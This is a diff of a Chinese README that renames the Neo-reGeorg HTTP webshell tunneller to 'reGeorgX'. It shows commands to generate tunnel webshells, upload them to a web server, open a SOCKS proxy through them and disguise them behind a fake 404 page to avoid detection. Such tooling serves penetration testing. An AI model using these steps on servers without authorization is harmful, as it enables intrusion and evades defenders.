@@ -1,7 +1,7 @@
 reGeorgX
 =========
 
-**Neo-reGeorg** 是一个旨在积极重构 [reGeorg](https://github.com/sensepost/reGeorg) 的项目，目的是：
+**reGeorgX** 是一个旨在积极重构 [reGeorg](https://github.com/sensepost/reGeorg) 的项目，目的是：
 
 * 提高 tunnel 连接安全性
 * 提高可用性，避免特征检测
@@ -41,23 +41,23 @@ Basic Usage
 * **Step 1.**
 设置密码生成 tunnel.(aspx|ashx|jsp|php) 并上传到WEB服务器
 ```ruby
-$ python neoreg.py generate -k password
+$ python reGeorgX.py generate -k password
 
-    [+] Create neoreg server files:
-       => neoreg_server/tunnel.nosocket.php
-       => neoreg_server/tunnel.js
-       => neoreg_server/tunnel.php
-       => neoreg_server/tunnel.ashx
-       => neoreg_server/tunnel.aspx
-       => neoreg_server/tunnel.tomcat.5.jsp
-       => neoreg_server/tunnel.jsp
+    [+] Create reGeorgX server files:
+       => reGeorgX_server/tunnel.nosocket.php
+       => reGeorgX_server/tunnel.js
+       => reGeorgX_server/tunnel.php
+       => reGeorgX_server/tunnel.ashx
+       => reGeorgX_server/tunnel.aspx
+       => reGeorgX_server/tunnel.tomcat.5.jsp
+       => reGeorgX_server/tunnel.jsp
 
 ```
 
 * **Step 2.**
-使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理
+使用 reGeorgX.py 连接WEB服务器，在本地建立 socks 代理
 ```ruby
-$ python3 neoreg.py -k password -u http://xx/tunnel.php
+$ python3 reGeorgX.py -k password -u http://xx/tunnel.php
 +------------------------------------------------------------------------+
   Log Level set to [ERROR]
   Starting socks server [127.0.0.1:1080], tunnel at [http://k/tunnel.php]
@@ -74,27 +74,27 @@ Advanced Usage
 
 1. 支持生成服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)
 ```ruby
-$ python neoreg.py generate -k <you_password> --file 404.html
-$ pytohn neoreg.py -k <you_password> -u <server_url> --skip
+$ python reGeorgX.py generate -k <you_password> --file 404.html
+$ pytohn reGeorgX.py -k <you_password> -u <server_url> --skip
 ```
 
 2. 如服务端WEB，需要设置代理才能访问
 ```ruby
-$ pytohn neoreg.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
+$ pytohn reGeorgX.py -k <you_password> -u <server_url> --proxy socks5://10.1.1.1:8080
 ```
 
 3. 如需Authorization认证，或者定制的Header或Cookie
 ```ruby
-$ pytohn neoreg.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value"
+$ pytohn reGeorgX.py -k <you_password> -u <server_url> -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie "key=value"
 ```
 
 * 更多关于性能和稳定性的参数设置参考 -h 帮助信息
 ```ruby
 # 生成服务端脚本
-$ python neoreg.py generate -h
-    usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]
+$ python reGeorgX.py generate -h
+    usage: reGeorgX.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]
 
-    Generate neoreg webshell
+    Generate reGeorgX webshell
 
     optional arguments:
       -h, --help            show this help message and exit
@@ -104,12 +104,12 @@ $ python neoreg.py generate -h
       --read-buff Bytes     Remote read buffer.(default: 513)
 
 # 连接服务端
-$ python neoreg.py -h
-    usage: neoreg.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]
+$ python reGeorgX.py -h
+    usage: reGeorgX.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]
                      [-x LINE] [--read-buff Bytes] [--read-interval MS]
                      [--max-threads N] [-v]
 
-    Socks server for Neoreg HTTP(s) tunneller
+    Socks server for reGeorgX HTTP(s) tunneller
 
     optional arguments:
       -h, --help            show this help message and exit
